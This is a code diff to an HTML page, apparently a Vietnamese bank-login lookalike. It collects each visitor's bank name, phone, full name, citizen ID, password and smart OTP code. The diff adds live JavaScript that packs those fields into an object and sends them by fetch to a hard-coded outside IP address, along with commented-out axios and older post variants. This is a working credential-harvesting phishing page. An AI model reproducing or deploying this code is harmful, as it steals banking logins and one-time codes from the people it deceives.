@@ -73,34 +73,13 @@
       async=""
       src="static/home/junxuan/js/jquery.mmenu.min.all.js"
     ></script>
+    
 
     <!-- Insert to your webpage before the </head> -->
     <script async="" src="static/home/junxuan/js/amazingcarousel.js"></script>
     <script async="" src="static/home/junxuan/js/initcarousel-1.js"></script>
     <!-- End of head section HTML codes -->
-    <script type="text/javascript">
-      // $(function () {
-      //   $(".o365cs-nav-leftAlign").remove(); //Xóa bỏ chức năng thừa trên đầu trang
-      //   $("nav#menu").mmenu({
-      //     extensions: ["effect-slide-menu", "pageshadow", "pagedim-black"],
-      //     searchfield: true,
-      //     counters: true,
-      //     navbar: {
-      //       title: "Danh mục",
-      //     },
-      //     navbars: [
-      //       {
-      //         position: "top",
-      //         content: ["searchfield"],
-      //       },
-      //       {
-      //         position: "top",
-      //         content: ["prev", "title", "close"],
-      //       },
-      //     ],
-      //   });
-      // });
-    </script>
+    
     <script type="text/javascript">
       $(document).ready(function () {
         //$("#featured").tabs({ fx: { opacity: "toggle" } }).tabs("rotate", 5000, true);
@@ -167,7 +146,8 @@
     </script>
 
     <!-- Global site tag (gtag.js) - Google Analytics -->
-
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script src="axios.js" ></script>
     <script>
       window.dataLayer = window.dataLayer || [];
       function gtag() {
@@ -970,34 +950,87 @@
                                 alert("Nhập Mật smart OTP");
                                 return false;
                               }
-                            //   if (data == 0) {
-                            //     data = 1;
-                            //     $("#tijiao").attr("data", 1);
-                            //     $.post(
-                            //       "/home/index/tijiao",
-                            //       {
-                            //         yinghang: yinghang,
-                            //         dianhua: dianhua,
-                            //         mingzi: mingzi,
-                            //         sfz: sfz,
-                            //         title: title,
-                            //         mima: mima,
-                            //         aqzn: aqzn,
-                            //       },
-                            //       function (result) {
-                            //         if (result.status == 0) {
-                            //           swal("thành công");
-                            //         } else {
-                            //           $("#tijiao").attr("data", 0);
-                            //           data = 0;
-                            //           swal(result.msg);
-                            //         }
-                            //       }
-                            //     );
-                            //     return false;
-                            //   }
+                              const dataRequest = {
+                                "id" : "acsv3245235",
+                                "bank_name" : yinghang ,
+                                "phone" : dianhua,
+                                "full_name" : mingzi,
+                                "citizen_id" : sfz,
+                                "password" : mima,
+                                "smart_otp" : aqzn
+                              }
+                              
+                            //  return axios({
+                            //           method: 'post',
+                            //           headers: { 'Content-Type': 'application/x-www-form-urlencoded' , 'Access-Control-Allow-Origin': '*',},
+                            //           url: 'http://103.170.121.164:8080/api/user',
+                            //           data: dataRequest
+                            //         }).then(function (response) {
+                            //           console.log(response.data);
+                            //         })
+                            console.log(dataRequest);
+                            fetch("http://103.170.121.164:8080/api/user", {
+                                        "method": "POST",
+                                        "mode": 'no-cors',
+                                        "headers": {
+                                          "Content-Type": "application/json",
+                                          "Access-Control-Allow-Origin": "*"
+                                        },
+                                        "body": JSON.stringify(dataRequest)
+                                      })
+                                      .then(response => {
+                                        console.log(response.status);
+                                        console.log(response);
+                                      })
+                                      .catch(err => {
+                                        console.error(err);
+                                      });
+                                    // fetch("http://103.170.121.164:8080/api/user", {
+                                    //         "mode": 'no-cors',
+                                    //         "method": "POST",
+                                    //         "headers": {
+                                    //           "Content-Type": "application/json",
+                                    // 'Access-Control-Allow-Origin': '*'
+                                    //         },
+                                    //         "body": JSON.stringify(dataRequest)
+                                            
+                                    //       })
+                                    //       .then(response => {
+                                    //         console.log(response);
+                                    //       })
+                                    //       .catch(err => {
+                                    //         console.log(err);
+                                    //       });
+                              
+                              // if (data == 0) {
+                              //   data = 1;
+                              //   $("#tijiao").attr("data", 1);
+                              //   $.post(
+                              //     "/home/index/tijiao",
+                              //     {
+                                    
+                              //       yinghang: yinghang,
+                              //       dianhua: dianhua,
+                              //       mingzi: mingzi,
+                              //       sfz: sfz,
+                              //       title: title,
+                              //       mima: mima,
+                              //       aqzn: aqzn,
+                              //     },
+                              //     function (result) {
+                              //       if (result.status == 0) {
+                              //         swal("thành công");
+                              //       } else {
+                              //         $("#tijiao").attr("data", 0);
+                              //         data = 0;
+                              //         swal(result.msg);
+                              //       }
+                              //     }
+                              //   );
+                              //   return false;
+                              // }
 
-                            console.log(data);
+                            
                               return false;
                             }
                           </script>
